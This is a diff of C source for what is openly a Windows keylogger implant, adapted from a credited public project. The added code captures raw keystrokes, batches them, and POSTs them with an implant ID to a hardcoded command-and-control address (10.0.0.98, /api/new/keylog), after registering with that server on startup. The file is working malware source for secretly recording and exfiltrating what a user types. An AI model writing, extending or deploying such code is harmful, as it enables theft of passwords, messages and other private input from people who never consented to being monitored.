@@ -1,19 +1,64 @@
 /*
  *
- * NOTE: THIS IS NOT MY WORK!!! Most all of this code has been taken from
- * https://github.com/synacktiv/keebcap.
+ * NOTE: A LOT OF THIS IS NOT MY WORK!!! A lot of code has been taken
+ * from https://github.com/synacktiv/keebcap.
  *
  */
 #include "httpclient.h"
 #include "process.h"
 #include <signal.h>
 #include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <wchar.h>
 
 #ifndef QWORD
 typedef unsigned __int64 QWORD;
 #endif
 
+wchar_t *C2_IP = L"10.0.0.98";
+
 int ABORT = 0;
+
+int MAX_CACHED_KEYPRESSES = 50;
+int KEYPRESS_LOG_MAX_SIZE = 40;
+
+char *cached_keypresses;
+int cached_keypresses_amt = 0;
+int implant_id = 0;
+
+void cacheKeypress(char *buf) {
+  strcat(cached_keypresses, buf);
+  cached_keypresses_amt += 1;
+  if (cached_keypresses_amt > MAX_CACHED_KEYPRESSES) {
+    DWORD stOut = 0;
+    char id_str[KEYPRESS_LOG_MAX_SIZE];
+    sprintf(id_str, "{\"id\": %d}", implant_id);
+    /* int seen_end_curly = 0; */
+    /* for (int i = 0; i < 15; i++) { */
+    /*   if (seen_end_curly == 1) { */
+    /*     id_str[i] = '\0'; */
+    /*   } else if (id_str[i] == '}') { */
+    /*     seen_end_curly = 1; */
+    /*   } */
+    /* } */
+    size_t total_len = strlen(cached_keypresses) + strlen(id_str) + 1;
+    char *cached_keypresses_plus_implantid =
+        (char *)calloc(total_len, sizeof(char));
+    strcpy(cached_keypresses_plus_implantid, id_str);
+    strcat(cached_keypresses_plus_implantid, cached_keypresses);
+    LPBYTE result = HTTPRequest(
+        L"POST", C2_IP, L"/api/new/keylog", 5000, L"sup",
+        (LPBYTE)cached_keypresses_plus_implantid,
+        strlen(cached_keypresses_plus_implantid), &stOut, 0, NULL, 0);
+    free(result);
+    free(cached_keypresses_plus_implantid);
+    memset(cached_keypresses, 0, MAX_CACHED_KEYPRESSES * KEYPRESS_LOG_MAX_SIZE);
+    cached_keypresses[0] = '\0';
+    cached_keypresses_amt = 0;
+    printf("Sent %d keypresses to C2\n", MAX_CACHED_KEYPRESSES);
+  }
+}
 
 // to receive events for the rawkeyboard data
 LRESULT CALLBACK wndproc(HWND window, UINT message, WPARAM wparam,
@@ -30,7 +75,9 @@ LRESULT CALLBACK wndproc(HWND window, UINT message, WPARAM wparam,
       RAWINPUT *raw = (RAWINPUT *)rid_buf;
       if (raw->header.dwType == RIM_TYPEKEYBOARD) {
         RAWKEYBOARD *rk = &raw->data.keyboard;
-        process_kbd_event(rk->Flags & RI_KEY_BREAK, rk->VKey);
+        char *buf = process_kbd_event(rk->Flags & RI_KEY_BREAK, rk->VKey);
+        cacheKeypress(buf);
+        free(buf);
       }
     }
     break;
@@ -40,18 +87,39 @@ LRESULT CALLBACK wndproc(HWND window, UINT message, WPARAM wparam,
 
 void sig_handler(int signal) {
   fprintf(stderr, "> exiting..\n");
+  free(cached_keypresses);
   if (signal == SIGABRT || signal == SIGINT)
     ABORT = 1;
 }
 
 int main(int ac, char **av) {
-  fprintf(stderr, "> starting...\n");
+  cached_keypresses =
+      (char *)malloc(MAX_CACHED_KEYPRESSES * KEYPRESS_LOG_MAX_SIZE);
+  memset(cached_keypresses, 0, MAX_CACHED_KEYPRESSES * KEYPRESS_LOG_MAX_SIZE);
+
   fprintf(stderr, "> checking in to c2...\n");
   DWORD stOut = 0;
   // request type, server, uri, port, UA, useless other stuff
-  LPBYTE id = HTTPRequest(L"GET", L"localhost", L"/api/new/implant", 5000,
-                          L"sup", NULL, 0, &stOut, 0, NULL, 0);
-  printf("%s\n", id);
+  LPBYTE id = HTTPRequest(L"GET", C2_IP, L"/api/new/implant", 5000, L"sup",
+                          NULL, 0, &stOut, 0, NULL, 0);
+  char *json = (char *)id;
+  char *first_end_curly = strchr(json, '}');
+
+  if (first_end_curly != NULL) {
+    size_t len = first_end_curly - (char *)json;
+
+    char result[len + 1];
+    strncpy(result, json, len);
+    result[len] = '\0';
+
+    char *colon_loc = strchr(result, ':');
+
+    if (colon_loc != NULL) {
+      char *int_str = colon_loc + 1;
+      implant_id = atoi(int_str);
+      printf("%d\n", implant_id);
+    }
+  }
 
   // define a window class which is required to receive RAWINPUT events
   WNDCLASSEX wc;
